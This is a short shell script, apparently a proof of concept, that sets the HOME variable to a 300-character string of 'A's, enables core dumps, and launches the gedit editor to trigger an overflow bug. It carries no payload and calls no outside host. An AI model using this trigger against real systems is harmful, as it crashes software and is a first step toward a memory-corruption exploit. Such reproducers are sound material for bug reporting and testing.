#!/bin/sh
echo "\nSetting the env var for HOME"
export HOME=`perl -e 'print "\x41"x300'`
echo "\nEnable core dump"
ulimit -c unlimited
echo "\nRun gedit editor to trigger the bug"
gedit
